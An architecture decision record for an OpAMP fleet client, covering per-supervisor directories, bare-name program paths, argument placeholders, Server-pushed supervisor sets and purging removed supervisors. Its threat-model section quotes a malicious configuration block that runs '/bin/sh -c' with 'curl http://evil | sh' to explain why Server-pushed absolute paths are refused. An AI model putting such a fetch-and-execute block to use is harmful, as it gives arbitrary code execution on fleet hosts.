# ADR-0019: One directory per Supervisor — the program it runs, the paths that name it, and where its blocks come from

- **Status:** 🟢 accepted
- **Date:** 2026-08-06
- **Deciders:** Markus Brigl

The points on the Supervisor set complete, on the Client side, the delivery path ADR-0012 and
ADR-0028 build on the Server side: a typed, published Configuration can reach the Client's own Agent
(`service.name = "opamp-fleet-client"`, ADR-0022/ADR-0023), and those points decide what the Client
*does* with it. They extend ADR-0011 (the `[[supervisor]]` blocks) and
ADR-0008 (`client.toml` as the configuration file) without changing either's shape.

This decision supersedes the machine-installed route of
[ADR-0030](0030-glpi-agent-supervision-and-packages.md) and the machine-installed fallback of
[ADR-0032](0032-icinga-2-through-the-fleet.md), and amends
[ADR-0015](0015-package-delivery-for-managed-processes.md) where it restates the three-way path rule. The placeholders
of point 6 are the only way to name a path in an argument.

## Context

### The program's path and the directory that holds it

A Supervisor configured exactly as [`config/supervisor.toml`](../../config/supervisor.toml) documents it
cannot take a package update:

```toml
[[supervisor]]
type = "collector"
name = "otelcol"
binary = "/usr/local/bin/otelcol-contrib"
accepts_packages = true
```

The swap moves *files*: the running binary is renamed aside to `<binary>.rollback`, the artifact is
written as `<binary>.staged`, made executable, and renamed into place (`swap_and_gate` and
`install_executable` in `crates/client/src/supervisor/process.rs`). All three operations need write
permission on the **directory**, not on the file. `/usr/local/bin` is `root:root 0755`; a Client
that does not run as root fails at the first rename and reports `InstallFailed` — at rollout time,
on every host the Selector matched, not at startup on one.

The configuration could therefore express something the filesystem forbids, and nothing checked it.
Two keys carry one truth: `accepts_packages` says *whether* the Server may replace this binary,
`binary` says *where* it is — and [ADR-0015](0015-package-delivery-for-managed-processes.md) and
[ADR-0016](0016-what-a-package-is-and-how-it-is-aimed.md) tie them together nowhere. The combination that
works and the combination that cannot are equally spellable.

Most of what the fix needs already exists. Every Supervisor already has its own directory,
`<state_dir>/supervisors/<name>/` (`build_engine`), holding its `instance-uid`, the received
`remote-config.pb`, `installed-package.json`, and the written `config/` entries; the block's `name`
is already validated through `parse_instance_name`, so it is by construction a legal directory name
on all three platforms ([ADR-0010](0010-client-os-service.md)'s grammar), and duplicates are
refused at startup. The one thing that directory does **not** contain is the only thing a package
update writes.

Two further forces point the same way:

- **The download staging is fleet-wide.** An artifact is streamed to `<state_dir>/packages/<name>.staged`
  (`packages.rs`) and then *copied* into the target directory — explicitly a copy and not a rename,
  because the two may sit on different filesystems (`install_executable`). For a Collector of a few
  hundred megabytes that is a full second write of the artifact on every update.
- **`state_dir` is state, and a binary is not.** The FHS calls `/var/lib` variable *state*; hardened
  hosts mount it `noexec`, and it is often sized for state rather than for several Collector
  binaries. ADR-0010 already puts the Client's own binary under a root of that kind — but it lets
  the operator choose that root (`--root`, "no fixed installation path"). A Managed Process's binary
  has no such knob at all.

**What the directory layout deliberately leaves open.** A Managed Process is not always one file. A
Foreign Agent — the specification's term for a Managed Process under a Custom Supervisor — may ship
as a tree: an executable plus shared objects, plugins, and data files; on Windows a `.dll` beside its
`.exe` is a load requirement, not a convenience. Such an agent cannot be delivered as a package
through [ADR-0017](0017-package-artifacts.md), which lifts exactly **one** member out of
an archive, and the layout below does not change that. That gap is left open on purpose: closing it
means giving up ADR-0017's guarantee that *"the archive never chooses a path"* in exchange for a
traversal defence, and no deployment needs it yet. The layout is chosen so that closing it later is
a widening — a configuration written under this decision stays valid under that one — rather than a
second change to the same key. Standard Collector distributions are single binaries and are fully
served by what is decided here.

Constraints this decision has to respect: ADR-0008 (hand-edited TOML, a typo fails loudly at
startup), ADR-0010 (the operator chooses the root; the name grammar), ADR-0015 (the swap, the health
gate, the rollback), ADR-0016 (the **Server** chooses which artifact; the host only consents — and
the precedent of refusing a removed key loudly rather than ignoring it), ADR-0017 (the artifact and
how it is opened, untouched here), and [ADR-0018](0018-client-self-update.md) (the Client's own
consent is explicit and names its package).

### A Foreign Agent's arguments

The relocatable root of point 1 opens a hole of its own: a Foreign Agent is told where
its configuration is **through its own command line**, and those arguments are passed verbatim
(`CommandSettings::args` → `ProcessSpec::args` in `crates/client/src/supervisor/command.rs`).
The example in [`config/supervisor.toml`](../../config/supervisor.toml) is the demonstration:

```toml
command = "/opt/fluent-bit/bin/fluent-bit"
args = ["-c", "/var/lib/opamp-fleet/client/default/state/supervisors/fluent-bit/config/fluent-bit-conf"]
```

Set `supervisor_dir`, and the written configuration moves while that argument does not. Fluent Bit
then starts — successfully — on a file the Server no longer writes to. Nothing errors: the process
is healthy, its Agent reports healthy, and the fleet's configuration silently stops arriving. An
operator who has just relocated a directory is not looking for that.

The Collector plugin has no such problem: its `--config` flags are built from the Supervisor's
`config_dir`, so they follow the directory wherever it goes. Only the operator-written command line
of a Custom Supervisor can drift, and it can drift in three ways — a path that is wrong from the
start, one that `supervisor_dir` moves out from under, and one that a *rename* of the Supervisor
breaks.

Two constraints shape what may be done about it. ADR-0008 fixes the configuration as hand-edited
TOML, so whatever this adds must be readable in a file and fail loudly when it is wrong. And
**the written shape of the program's path** decides whether a block is accepted at all (point
2) — which means the program path in particular must not be built by substitution, or
that decision would depend on a value the file does not show.

### The Supervisor set from the Server

The Client's own Agent declares `AcceptsRemoteConfig`, and without this decision that declaration
is hollow: a `remote_config` offered to the self-Agent is stored and acknowledged `APPLIED`
([`agent.rs`](../../crates/client/src/supervisor/agent.rs#L851-L886), "storing *is* applying") —
and then changes nothing. The fleet view can show the Client's own configuration and offer it
Configurations typed for it, but the Client would answer every offer with a polite lie.

What the fleet actually needs to manage on a Client is *which Supervisors it runs*: the
`[[supervisor]]` blocks of `client.toml` (ADR-0011). Everything else in that file is host-local
trust and wiring — the Server endpoint, the credential, the state directory, the instance name.
That half must never be Server-writable: the configuration that tells the Client where the Server
is and how to authenticate cannot come from the Server without making a bad push unrecoverable
(the Client that applied it can no longer be told anything).

The specification's vocabulary already anticipates the shape of the answer: the effective
configuration "may differ from the remote configuration (it may **merge in local
configuration**, or have rejected the remote one)"
([`SPECIFICATION.md`](../SPECIFICATION.md), Fleet operations). The OpenTelemetry OpAMP
Supervisor does exactly this — remote configuration merged with local configuration files into
the one document the managed process runs.

Two mechanics constrain the design:

- **Supervisors are built once, at startup** ([`supervisor/mod.rs`](../../crates/client/src/supervisor/mod.rs)):
  the Engine's Agent set never changes while the Client runs, and the reconfigure path
  (`RunOutcome::Reconfigured`) deliberately carries the Engine and its Managed Processes across
  reconnects untouched. Applying a Supervisor change at runtime is new machinery.
- **`client.toml` is what the self-Agent reports as its effective configuration**
  ([`supervisor/mod.rs`](../../crates/client/src/supervisor/mod.rs#L80-L97)): the file is the
  truth the fleet view shows. Wherever a Server-delivered Supervisor set is persisted, that
  report must keep being true.

### A pushed block is a different principal

Point 11 validates the merged document "by the same loader that validates `client.toml`
at startup (block schema, program-path resolution, ports, timeouts)."
The startup loader refuses an absolute program path for every block (point 3); the
threat below is why the delivery path still checks on its own.

A Server-pushed block is a different principal. Were an absolute path accepted from an offered
document, a Server — or anyone who has compromised one, *without* the package-signing key — could
push:

```toml
[[supervisor]]
type = "command"
name = "x"
command = "/bin/sh"
args = ["-c", "curl http://evil | sh"]
```

and the Client would spawn it. That is fleet-wide command execution as the Client's user (root under a
service install) that needs **no** Ed25519 signature and no content hash — it side-steps the entire
`[packages] verification_key` machinery the rest of the Client enforces. A security review raised it:
`crates/client/src/reconfigure.rs` calls `validate_block`, which resolves the program the ordinary
way and by itself imposes no owned-only rule.

The forces:

- **The operator's file and the Server's push are different trust levels.** Point 10
  already draws this line for *globals* — endpoint, credentials, and `state_dir` are the host's
  trust anchors and the Server must never write them. The program a Supervisor spawns is the same
  kind of anchor: naming an arbitrary absolute path *is* choosing what code runs on the host, which
  is precisely what admission (ADR-0013) plus package signing (ADR-0015/0018) exist to gate.
- **Package delivery already has a consent model.** A bare name means "this Client owns the
  directory, so the Server may install here". A pushed Supervisor whose program is a bare name is
  therefore *already* consenting to run Server-delivered, signature-verified artifacts — nothing
  more is needed for the Server to put a program there legitimately.
- **An absolute path adds nothing the fleet path needs.** A Server-managed Supervisor exists to run
  what the Server delivers; pointing it at a pre-existing machine binary is the operator's local
  concern, not a fleet rollout. Refusing absolute paths in a pushed block costs the delivery path no
  capability it is meant to have.
- **The globals argument does not cover the program.** The reasoning about the Supervisor set treats
  globals as trust anchors; the program path inside a block is carried along by "the same loader",
  not decided on its own merits. The owned-only rule decides it.

### A removed Supervisor's directory

When a Supervisor leaves the set — the apply of point 12 diffs the offered
`[[supervisor]]` blocks against the running ones and retires what left — the Client stops its
Managed Process and sends the Agent's `agent_disconnect`
([`engine.rs`](../../crates/client/src/engine.rs#L636-L662)). Stopping alone does not touch the
disk: the whole per-Supervisor directory stays behind —

```
<supervisor_dir>/<name>/
  instance-uid            # the Agent identity that just said goodbye
  remote-config.pb        # its last received configuration
  installed-package.json  # what was installed
  config/                 # the written configuration entries
  program/                # the Client-owned binary — a Collector is hundreds of megabytes
  packages/               # download staging
```

Without a purge, nothing ever reclaims it. There is no other cleanup keyed to a retired Supervisor
anywhere in the Client (the only `remove_dir_all` calls are package-staging housekeeping), and no
startup pass over `supervisors_root()` looks for directories no block names. The e2e test pins
exactly this contract: after a removal, the goodbye arrives and the file no longer names the block —
the directory is not mentioned ([`e2e.rs`](../../crates/client/tests/e2e.rs#L465-L495)).

The leftovers are not just disk waste, though on a host whose fleet role changes a few times they
are that too (one Collector binary per removed Supervisor). They are **stale identity and stale
trust**: a Supervisor later re-added under the same name silently inherits the old `instance-uid` —
an Agent that formally disconnected resurrects with its predecessor's identity and history — plus
the old remote configuration and whatever program version the old install left, instead of starting
as the new Agent it is. The Consequences below flag the shape of this problem for a *moved* root
("changing `supervisor_dir` on a running host leaves the old tree behind — `instance-uid`
included") and leave it to the operator; a *Server-driven removal* has no operator on the host, so
nobody is there to clean up.

Constraints: the directory layout of point 1 and the ownership rule of the program path
(the program is always a bare name in the Client-owned `program/` directory),
the apply order of point 12 (stop, write `client.toml`, start; a failed write restarts
the stopped Supervisors from the old file), and ADR-0015 (retention applies to a *superseded package
version* of a living Supervisor — not to a Supervisor that no longer exists).

### One kind of Managed Process

The path rule makes the *shape* of a program's path the whole of a host's consent to package
updates. A bare file name means the program lives in the Supervisor's own directory, the Client owns
it, and the Agent declares `AcceptsPackages`. An absolute path would mean someone else's file — a
distribution package, configuration management — spawned but never written to, with no package
capability declared.

Six decisions build on that second row, and it has become the seam along which this Client does two
different jobs. That the seam spreads this fast is the argument for closing it now rather than later.

**A fleet that cannot update an Agent is supervising, not managing.** The absolute-path route
delivers health, restart and central configuration, and explicitly *not* updates: ADR-0030 states it
plainly — "GLPI Agent updates stay with the machine's package manager, invisible to the fleet." That
is a coherent product, but it is a different one. Every capability this project builds for the
managed case — Selector-targeted packages (ADR-0016), the version rules (ADR-0034), rollback and
the health gate (ADR-0015) — stops at the boundary, and every feature has to be reasoned
about twice: once for a program the Client owns and once for a program it merely runs.

**The rule is invisible where it matters and irreversible where it does not.** An operator who
"fixes" a path to an absolute one silently revokes a fleet-visible capability; a startup log line is
the only thing that makes the derived state readable. And the Server cannot correct it: the delivery
path refuses a block naming an absolute path (point 16), so a host that has drifted into
the unmanaged shape can only be fixed by hand, on the host.

**The two principals diverge.** The delivery rule draws the line where it does — the operator may
write an absolute path locally, the Server may not deliver one — because the local file is the
operator's authority. That is right as far as it goes, but it means the fleet's model of a host
depends on which of two files the block came from, and only one of them the fleet can see.

**What makes this decidable is that the alternative exists.** ADR-0032 repacks vendor software as
relocatable trees, and ADR-0030 does it for GLPI Agent on both platforms. A vendor agent can be
brought under fleet ownership, and that route has been exercised. The absolute-path row is not the
only route to a vendor agent — it is the route that keeps one outside the fleet.

## Decision

### The Supervisor's directory and its program

We will require every Managed Process to be a program **this Client installs and owns**, give every
Supervisor one directory it owns, and let the operator place that directory. The program's path is
a bare file name; an absolute path is a startup error naming the rule.

1. **A relocatable Supervisor root.** A new optional top-level key `supervisor_dir`
   defaults to `<state_dir>/supervisors` — unchanged behaviour when it is absent. Under it, one
   directory per Supervisor, holding everything that Supervisor needs:

   ```
   <supervisor_dir>/<name>/
     instance-uid            # identity
     remote-config.pb        # the received configuration
     installed-package.json  # what was installed
     config/                 # the written configuration entries
     program/<binary>        # the Managed Process, with its .rollback and .staged siblings
     packages/               # this Supervisor's download staging
   ```

   One knob moves the whole tree, state and program together — not a second knob for the program
   alone. The staging moving in beside `program/` makes the install a rename within one filesystem
   instead of a copy across two. This is
   [ADR-0011](0011-supervisor-mode-core-and-plugins.md)'s per-Supervisor state directory,
   given two more subdirectories and a root the operator can choose; what a Supervisor owns is
   unchanged, only where it may be put.

   The directory is called `program/` and not `bin/` deliberately. It holds one file today; if the
   Foreign-Agent tree of the Context is ever unpacked, it lands under the same root and no path on
   disk moves. A directory name is cheap now and a layout migration is not.

2. **One shape, and it means what it always meant.** `binary` and `command` take a bare
   file name — no path separator, no `..` — resolving to `<supervisor_dir>/<name>/program/<value>`,
   or `program/tree/<program_path>` for a multi-file package (ADR-0015, unchanged). The Client owns
   that directory, so it may replace what is in it, and **every** Agent therefore declares
   `AcceptsPackages`. There is no second row and no third.

3. **An absolute path is refused at startup**, naming both the rule and the way across:
   the program belongs to the machine, and a program the fleet is to manage must be delivered as a
   package (ADR-0017, ADR-0032). The message says which block, which value, and what to do — it is
   the only notice an operator upgrading into this change will get, so it carries the whole
   explanation rather than a rule number. The Windows drive-relative case (`\Program Files\…`, no
   drive letter) folds into the same error; it was only ever a near-miss of the absolute form.

   A bare name consequently **does not mean "search `$PATH`"**. `Command::new` has `execvp`
   semantics, so a bare `command = "fluent-bit"` would search the path. That behaviour is
   undocumented, used in no example, and fragile under a service manager whose `PATH` is minimal —
   we take the break rather than add a further case to preserve it.

4. **`accepts_packages` is removed and refused loudly.** A `client.toml` still carrying it
   fails at startup with a message naming the path rule — the same treatment ADR-0016 gave
   `package`, for the same reason: never silently ignore a key an operator believes in.

5. **Consent stops being derived, because there is nothing left to derive.** The startup
   line, once per Supervisor, is a statement of where the program is
   (`supervisor otelcol: packages accepted, program in <dir>`); there is no "declined" form. The
   `AcceptsPackages` capability is a constant of this Client, not a function of its configuration —
   which is what the path rule was for, and it is now discharged by the type system rather than by
   a rule.

**What deliberately does not change:**

- **ADR-0016 stands.** *Which* artifact an Agent receives is still the Server's decision, expressed
  as the package's Selector. This decision replaces only how a host says *yes*, not who chooses.
- **ADR-0017 stands, whole.** One member is lifted out of an archive to a destination this Client
  picked; no archive path is ever used. Only the destination moves.
- **ADR-0015's swap stands.** Rename aside, write, rename into place, health-gate, roll back — the
  same file-level mechanics, in a directory the Client owns.
- **No `versions/` + `current` layout for Managed Processes.** ADR-0010 needs it because the running
  Client cannot overwrite itself; a Managed Process is stopped before its swap and `.rollback`
  already covers the fallback.

### Paths in a Foreign Agent's arguments

We will substitute a small, fixed set of **placeholders naming the Supervisor's own directories**
into a Custom Supervisor's `args`, `working_dir`, and `env` values — and never into the program
path.

6. **Two placeholders, both directories the Client alone decides the location of:**

   | Placeholder | Expands to |
   |---|---|
   | `${supervisor_dir}` | `<supervisor_dir>/<name>` — everything that Supervisor owns |
   | `${config_dir}` | `<supervisor_dir>/<name>/config` — where the received configuration's entry files are written (ADR-0012) |

   The fluent-bit example becomes `args = ["-c", "${config_dir}/fluent-bit-conf"]`, which cannot
   drift: both halves are now derived from the same place.

7. **The program is excluded**, in `binary` and `command` alike. This follows systemd,
   where specifiers are expanded in a unit's arguments but explicitly *not* in the executable path —
   and here there is a second reason: under points 2 and 3 the shape of
   that value decides whether the block is accepted at all, so a substituted program path would make
   that decision depend on something the file does not literally say.

8. **An unrecognized `${…}` is left verbatim.** It is not an error and not silently
   emptied. A Foreign Agent's own configuration language may use the same syntax — Fluent Bit's
   does — and a Client that ate or rejected those would break a working deployment to catch a typo.
   The names are substituted; everything else is the process's business.

9. **Substitution happens once, at startup**, on the values as written. Nothing
   re-expands when a configuration arrives, because none of these paths change while the Client
   runs.

### The Supervisor set from the Server

We will make the Client apply a remote configuration **to its `[[supervisor]]` blocks only** —
compare, validate the merge, stop what left, write `client.toml`, start what arrived — and refuse
to let a remote configuration touch anything else in the file.

10. **Only the `[[supervisor]]` blocks of the offered document are read.** Each entry of
   the composed config map is parsed as TOML; the union of their `[[supervisor]]` blocks is the
   offered Supervisor set, and every other top-level key is **ignored** — the boundary is
   enforced by what the Client takes, not by policing what the Server sends. An operator may
   thus publish a full `client.toml`-shaped document (say, one copied from a reference host) and
   exactly its fleet-manageable half takes effect; what actually runs is verifiable in the fleet
   view, which shows the Client's own `client.toml`. A duplicate Supervisor `name` within or
   across entries still fails the offer (`FAILED`, with the reason) — that is not a foreign key
   but a genuine ambiguity inside the accepted scope.

11. **The merge is: local globals, offered Supervisors.** The new document is the current
   `client.toml` with its `[[supervisor]]` blocks replaced by the offered set — nothing else
   changes hands. The merged document is validated by the same loader that validates
   `client.toml` at startup (block schema, program-path resolution, ports, timeouts). A merge
   that fails validation is reported `FAILED`; nothing is stopped, nothing is written, the
   running configuration stays in force.

12. **Apply is a diff, keyed by Supervisor `name`.** Comparing the running blocks with the
   offered ones yields removed, changed (any key differs), added, and unchanged. Then, in order:
   the removed and changed Supervisors are **stopped** (their Managed Processes shut down, their
   Agents say `agent_disconnect`); the merged document is **written to `client.toml`**; the
   changed and added Supervisors are **started** from the file just written. Unchanged
   Supervisors keep running untouched — the point of managing the set from the Server is that a
   fleet-wide change to one Supervisor does not cycle its neighbours. A crash between the stop
   and the write restarts into the old file; one between the write and the start restarts into
   the new one — both converge, because startup builds exactly what the file says.

13. **`client.toml` remains the single truth.** No overlay, no second file: after an
   apply, the file *is* the configuration, the same file the operator reads and the self-Agent
   reports — the effective-configuration report is refreshed from the written file in the same
   step. A Client restarting offline starts the Server-delivered Supervisors, because they are in
   its file. The write preserves the operator's half literally — comments, ordering, formatting —
   by editing the TOML document surgically (`toml_edit`, the format-preserving parser cargo
   itself edits manifests with) rather than re-serializing it.

14. **The status lifecycle becomes honest.** The self-Agent acknowledges `APPLYING` on
   receipt, `APPLIED` once the file is written and the starts are issued, `FAILED` when parsing,
   validation, or the write fails. A started Supervisor whose process then crashes is a *health*
   fact, reported as such — the configuration was applied; the process is unhealthy. "Storing is
   applying" ends; the stored copy remains what a restart reports its hash from.

15. **No offer, no change.** A Client whose Server never publishes a Configuration typed
   `opamp-fleet-client` runs its locally written `[[supervisor]]` blocks exactly as written. The
   first applied offer replaces the local set — from then on the Server's set is authoritative
   for Supervisors on that Client, which is the point, and the reason the offer is compared
   against the *file*, not against the last offer.

16. **A Server-offered block names only a Client-owned program.** The Client refuses a
   Server-offered Supervisor set in which any `[[supervisor]]` block names a program that is not
   this Client's own — i.e. the program (and, for a tree, its `program_path`) must resolve to a
   **bare file name** (`owned = true`), never an absolute path. The refusal is a validation failure
   of the whole offer: nothing is stopped, nothing is written, the running set stays in force, and
   the self-Agent reports the offer `FAILED` with a reason that names the offending block and
   program (point 14). This tightens point 11: the merged document is still
   validated by the startup loader, and then the offered blocks additionally must all be `owned`.

17. **The Server's delivery check stays, and stops being able to fire.** The rule of
   point 16 — a delivered `[[supervisor]]` block must name a program the Client owns —
   is satisfied by every block that parses. The check remains in the apply path (`reconfigure.rs`)
   as defence in depth against a future shape nobody has thought of yet, with a comment saying so;
   deleting a guard because it currently cannot trigger is how it comes back.

### A removed Supervisor is purged

We will make the apply of point 12 **delete a removed Supervisor's directory** after its
Agent has retired and the new `client.toml` is written: stop the Managed Process, say the goodbye,
and then remove `<supervisor_dir>/<name>/` recursively — program, packages, configuration, and
identity.

18. **Removed means removed, not changed.** The purge applies only to names absent from
   the new set. A *changed* block is stopped and restarted by the same apply (point
   12) and keeps its directory — identity, program, and installed package ride through
   a change exactly as they would without a purge.

19. **The purge comes after the write, and only after it succeeds.** The apply order stays
   stop → write → start, with the purge between write and start. A write that fails restarts the
   stopped Supervisors from the still-standing old file (point 12) — their directories
   must still be whole, so nothing is deleted before the file says the Supervisor is gone.

20. **The Client deletes only what it owns.** The per-Supervisor directory is
   Client-created state and is removed whole — including `program/`, which holds the Client-owned
   binary (point 2). Nothing outside that directory is touched.

21. **A directory the apply cannot delete fails nothing.** The Supervisor is already
   stopped, the file already written; a purge error (a file held open on Windows, permissions) is a
   warning naming the path, not a `FAILED` apply — the set the Server asked for *is* running. The
   directory becomes an orphan (point 22).

22. **An orphaned directory is reported, not reaped.** At startup, a directory under
   `supervisors_root()` that no `[[supervisor]]` block names is logged as a warning with its path —
   whether it survived a purge error, a crash between write and purge, or a block removed from
   `client.toml` by hand while the Client was down. It is **not** deleted: a hand edit is an
   operator's act on the operator's file (the boundary of point 10), and a block
   temporarily commented out must not cost the Agent its identity and program. The log line makes
   the leftover visible; removing it stays the operator's call.

### Every Managed Process is the fleet's

23. **`[self_update]` keeps naming its package explicitly.** The asymmetry with the
   Supervisors' path-derived consent is preserved and its reasoning is unchanged: a package written
   over the Client takes the host out of reach, which is exactly where implicit consent would be
   wrong. Nothing here touches ADR-0018's consent rule.

24. **A vendor agent is brought in by repacking, and that is the supported route.**
   ADR-0030 for GLPI Agent and ADR-0032 for Icinga 2 are what an operator uses instead. The
   manual's machine-installed walkthroughs are replaced by the fleet-delivered ones, not merely
   deleted, so every case the old route documented has a page describing the new one.

## Alternatives considered

### The program path and package consent

- **Keep `accepts_packages` and reject the combination with an absolute path** — factually wrong:
  `/opt/otelcol/bin/otelcol`, owned by the service user, is a perfectly updatable setup, and the
  rule would forbid it. The real predicate is "does the Client own this directory", which
  *absoluteness* only approximates. It also leaves two keys that can still disagree.
- **Keep both keys and merely document the permission requirement** (a comment in `client.toml`) —
  the trap survives. The configuration still expresses what the filesystem forbids, and the failure
  still appears at rollout time across the fleet rather than at startup on one host.
- **Probe writability at startup and derive consent from that** — makes a fleet-visible capability
  depend on a `chmod` nobody recorded, and races a rollout when permissions change afterwards.
  Whose file it is, is a decision; it should be written down, not measured.
- **Decide multi-file packages here too** — allow a relative path with depth, unpack an archive
  whole, swap the tree by directory rename. It is the same layout and it would work, but it trades
  ADR-0017's *guarantee* ("no archive path is ever used") for a *defence* (every archive path
  checked, links refused, total size and member count bounded), and defences have bugs that
  guarantees cannot. Nothing deployed needs it: standard Collector distributions are single
  binaries. Deferred, and deferrable at no cost — see the follow-ups below.
- **A separate `bin_dir` beside `state_dir`** — two knobs for a separation nobody has asked for.
  If state and program must diverge, the operator can still symlink; the tree stays one thing.
- **A per-Supervisor `supervisor_dir` inside each `[[supervisor]]` block** — more expressive than any
  reported need; one root per Client matches how ADR-0010 already treats the Client's own root.
- **Require `./` for the bare-name meaning, keeping a bare name as a `$PATH` lookup** — a further
  case in the rule, and a leading `./` reads as noise in TOML (and worse on Windows), all to
  preserve behaviour that is undocumented and unused.
- **Keep the absolute-path row and leave it to operators.** It costs nothing on its own. Rejected
  because the cost is not in the rule but in everything built beside it: every package, version and
  rollback decision carries a second case, and the fleet's picture of a host depends on which file
  a block came from. The seam does not stay still — ADR-0034 already had to reason about hosts
  crossing it.
- **Deprecate rather than remove — warn at startup, remove later.** Genuinely tempting, and it was
  the recommendation until the field was checked: with nothing installed, there is no host to warn.
  A deprecation period protects deployments, and there are none. What it would buy instead is time
  to prove ADR-0032 on Windows — see the trade-off below, which is the real cost of not waiting.
- **Keep absolute paths for *supervision only* — a documented, capability-less mode.** This is what
  the absolute-path row is, named honestly. Rejected because naming it does not reduce it: the two
  cases still exist in the code, in every feature's reasoning, and in the fleet view. If the mode is
  worth having, it is worth having as its own decision with its own model, not as a fallthrough in
  a path parser.

### Paths in arguments

- **Default `working_dir` to the Supervisor's own directory**, so relative arguments simply resolve
  there. Fewer moving parts and no new syntax — this was the first proposal — but it changes the
  meaning of every existing `command` block silently, and it points a foreign process's *working
  directory* at a tree whose layout the Client owns. A process that drops a file beside itself would
  litter that directory, and one that writes `config` or `program` would collide with it. Buying a
  smaller diff with a shared directory is the wrong trade.
- **Resolve a relative `working_dir` against the Supervisor's directory** (reusing the program-path
  rule on a second key) — attractive for its consistency, but the program rule's bare name resolves
  into `program/`, and a working directory wants the Supervisor root. The same-looking rule would
  mean two different things depending on the key, which is worse than a second mechanism that admits
  it is one.
- **Export the paths as environment variables** (`OPAMP_CONFIG_DIR`, as systemd's `StateDirectory=`
  exports `$STATE_DIRECTORY`) — nothing expands variables in `argv`, so it would not reach the case
  this exists for. Worth revisiting for agents that read their environment, but not as the answer
  here.
- **Leave it, and document that an absolute path must be kept in sync with `supervisor_dir`** — the
  failure is silent and the two settings live in the same file, so the only thing keeping them
  consistent would be the operator's memory.
- **A general templating engine** over the whole configuration — far past any present need, and it
  turns a configuration file into a program.

### The Supervisor set from the Server

- **The Server delivers the whole `client.toml`** — rejected in Context: endpoint, credential,
  and state directory are the host's trust anchors; a Server that can rewrite them can cut a
  Client off with one bad push, and the Client has no path back. The Supervisor set is the
  fleet-shaped half of the file; the boundary runs exactly there.
- **A separate overlay file** (state-dir resident, merged at load — the OpAMP Supervisor's
  model, which keeps the last received remote configuration beside the local files). Rejected:
  two files would answer "what does this Client run", the effective-configuration report would
  have to merge them to stay truthful, and an offline restart would depend on state-dir
  internals the operator never sees. Writing the one documented file keeps the one truth.
- **Restart the Client (or all Supervisors) to apply** — the machinery exists
  (`Exit::RestartForUpdate`) and would avoid runtime Agent-set changes. Rejected: it cycles
  every healthy Supervisor to change one, which on a host running several collectors is exactly
  the disruption Selector-scoped rollouts exist to avoid.
- **Fail the offer on any non-Supervisor top-level key** instead of ignoring them. Rejected: it
  turns tolerable input into a fleet-visible error and makes the offer format needlessly rigid —
  a document with one stray global key would apply nothing, though what to do with it is
  unambiguous. The risk of ignoring — an operator believing a pushed global key took effect —
  is answered by the fleet view showing the file that actually runs (point 13), not by
  refusing the Supervisors that came with it.
- **Re-serialize `client.toml`** with the ordinary `toml` writer instead of adding `toml_edit`.
  Rejected: it destroys the operator's comments and layout in the one file this project
  documents *as* commented prose (the shipped example config) — the file would stop being the
  operator's after the first apply. The dependency is the price of point 13's "remains
  the operator's file"; cargo's own manifest editing is the precedent that it is fit for this.
- **Leave a pushed block's program unchecked — the Server is trusted to manage Agents.** Rejected:
  it makes the whole package-signing apparatus decorative. The threat is a Server compromised below
  the signing key (a leaked REST credential, a mis-scoped operator); signing is meant to keep such
  an actor from running arbitrary code, and an unsigned absolute-path spawn is the exact bypass.
  Admission is a fleet-wide trust boundary (ADR-0013), but that boundary is about *identity between
  Agents*, not a licence for the Server to run any binary on every host.
- **Allowlist specific absolute paths in `client.toml`.** Rejected: it reintroduces host-local
  policy the operator would have to maintain per host, and the fleet path has no need of absolute
  paths at all — the bare-name/owned case already covers everything a Server-delivered Supervisor
  does. A configurable escape hatch is complexity for a capability with no established use.
- **Warn and apply anyway.** Rejected: a warning on a code-execution boundary is not a control. The
  offer is refused as a whole, consistent with how a merge that fails validation is treated (point
  11).
- **Let the Server deliver absolute paths too, and drop the delivery restriction of point
  16 instead.** The opposite resolution of the same asymmetry: make both principals
  equal by widening rather than narrowing. Rejected outright — it hands a Server the ability to run
  any binary on any host by absolute path, which is the escalation the delivery restriction exists
  to prevent.

### A removed Supervisor's directory

- **Keep the data** — rejected: it leaks a program-sized directory per removal, and a re-added
  Supervisor of the same name resurrects a disconnected Agent's identity and stale configuration
  instead of starting fresh. The Server-driven removal path has no operator on the host to clean up
  after it.
- **Keep the identity, delete the rest** (preserve `instance-uid`, purge program and state) —
  rejected: half-measures split the directory into kept and deleted parts nobody can reason about,
  and a removed Supervisor's identity *should* end — its Agent said `agent_disconnect`; the
  Baseline's goodbye is meaningless if the same identity reconnects later as something else.
- **A retention window before deletion**, like ADR-0015's `retain_previous_secs` — rejected:
  that retention exists so a *living* Supervisor can roll back to its previous version; a removed
  Supervisor has no process left to roll back. Re-adding it is a fresh install by the same
  delivery path that installed it the first time. A grace period would be machinery for an undo
  nobody has asked for, against Simplicity first.
- **Rename aside instead of deleting** (`<name>.removed-<timestamp>/`) — rejected: it converts a
  leak into a slower leak and hands the operator a janitorial duty the removal was supposed to
  perform.
- **Also reap orphaned directories at startup** — rejected as the default (point 22 logs
  instead): startup cannot tell a Server-driven removal's leftover from an operator's deliberate or
  temporary hand edit, and the destructive reading of that ambiguity deletes an identity and a
  program that were not meant to go. If the log line proves insufficient, a follow-up can revisit
  reaping with an explicit opt-in.

## Sources / Prior art

- **OpenTelemetry `opampsupervisor`** — a per-supervisor `storage.directory` (default
  `/var/lib/otelcol/supervisor`, `%ProgramData%/Otelcol/Supervisor` on Windows) alongside an
  absolute `agent.executable`: the same split between the supervisor's own tree and a foreign
  binary, except that upstream never expresses consent at all. It writes the merged Collector
  configuration to a directory it owns and passes it with `--config`, exactly as this project's
  Collector plugin does; it has no Foreign-Agent equivalent, and expansion in its own configuration
  is still an open request upstream (`opentelemetry-collector-contrib#36269`).
  <https://github.com/open-telemetry/opentelemetry-collector-contrib/tree/main/cmd/opampsupervisor>
  <https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/cmd/opampsupervisor/README.md>
- [OpenTelemetry OpAMP Supervisor](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/cmd/opampsupervisor/README.md)
  and its [specification](https://github.com/open-telemetry/opentelemetry-collector-contrib/blob/main/cmd/opampsupervisor/specification/README.md)
  (checked 2026-08-12) — the established remote-plus-local merge, with explicit precedence
  control (`agent.config_files` placeholders). Taken: the merge and the local-wins boundary for
  host-local settings. Not taken: the separate storage of the remote part (see Alternatives).
- **OpAMP Supervisor (opamp-go) and the Collector's Supervisor** deliver an *agent the Supervisor
  itself owns and installs*; they do not offer "run this arbitrary host binary" as a remote-config
  primitive — the managed executable is the Supervisor's own, which is the owned-only shape the
  delivery rule makes mandatory for the pushed case.
